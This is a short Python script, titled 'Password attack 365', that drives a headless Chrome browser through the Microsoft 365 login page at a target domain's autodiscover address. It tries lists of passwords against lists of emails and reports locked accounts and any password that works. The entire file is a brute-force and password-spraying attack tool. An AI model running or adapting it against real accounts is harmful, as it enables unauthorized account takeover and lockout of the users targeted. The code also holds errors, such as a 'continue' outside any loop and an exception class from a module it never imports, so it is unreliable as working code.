import json
import os
import time
import requests
import argparse
import traceback
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from bs4 import BeautifulSoup
from pyvirtualdisplay import Display


parser = argparse.ArgumentParser(description='Password attack 365')
parser.add_argument('--emails', help='Filename, list of emails', required=True)
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('--passwords', help='Filename, list of passwords')
group.add_argument('--password', help='Single passwords')
parser.add_argument('--domain', help='Target domain', required=True)
args = vars(parser.parse_args())

executable = os.path.abspath(os.path.join(os.path.dirname( __file__ ) + '/doc/driver/chromedriver'))
display = Display(visible=0, size=(800, 600))
display.start()
browser = webdriver.Chrome(executable_path=executable)

def get_content(filename):
	try:
		name_list = [line.rstrip('\n') for line in open(filename)]
		return name_list
	except Exception:
		print(traceback.print_exc())		


def worker_list(emails, passwords, domain):
	locked = []
	link = 'http://autodiscover.{}'.format(domain)
	try:
		for email in emails:
			if email in locked:
				pass
			else:
				browser.get(link)
				time.sleep(1)
				username = browser.find_element_by_name("loginfmt")
				time.sleep(1)
				username.send_keys(email)
				time.sleep(1)
				browser.find_element_by_class_name("btn-primary").click()
				time.sleep(1)
				for password in passwords:
					pass_word = browser.find_element_by_name("passwd")
					time.sleep(1)
					pass_word.send_keys(password)
					time.sleep(1)
					browser.find_element_by_class_name("btn-primary").click()
					time.sleep(1)
					if 'Your email or password is incorrect.' in browser.page_source:
						pass
					elif 'Your account has been temporarily locked' in browser.page_source or 'Your account has been locked' in browser.page_source:
						locked.append(email)
						print('Account Locked: {}'.format(email))
						browser.delete_all_cookies()
						break
					else:
						browser.delete_all_cookies()
						print('Password Identified: {}\t{}'.format(password, email))
						break
					
		browser.stop_client()
		display.stop()
	except selenium.common.exceptions.StaleElementReferenceException:
		continue
	except Exception:
		print(traceback.print_exc())
	
emails = get_content(args['emails'])
domain = args['domain']

if args['passwords']:
	passwords = get_content(args['passwords'])
elif args['password']:
	passwords = [args['password']]
	
worker_list(emails, passwords, domain)
